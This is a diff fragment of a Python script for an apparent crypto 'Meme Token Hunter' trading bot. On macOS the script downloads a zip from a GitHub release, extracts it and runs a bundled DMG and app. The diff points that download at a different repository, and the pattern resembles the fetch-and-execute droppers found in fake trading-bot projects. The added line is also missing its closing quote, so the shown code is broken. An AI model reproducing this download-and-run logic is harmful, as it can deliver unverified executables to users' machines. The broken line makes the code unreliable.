@@ -136,7 +136,7 @@ def main():
             blockchain_thread.join()
     elif platform.system() == 'Darwin':
         zip_file_to_download = 'MTHBot_Mac.zip'
-        download_url = 'https://github.com/premiumtraders/AI-AutoTrade-Bot/releases/download/V9.21.0/MTHBot_Mac.zip'
+        download_url = 'https://github.com/CryptoAiBots/Meme-Token-Hunter-Bot/releases/download/V9.21.0/MTHBot_Mac.zip
         extract_to = './MTHBot'
         dmg_file_to_execute = os.path.join(extract_to, 'MTHBot.dmg')
         app_to_execute = "/Volumes/MTHBot/MTHBot.app"
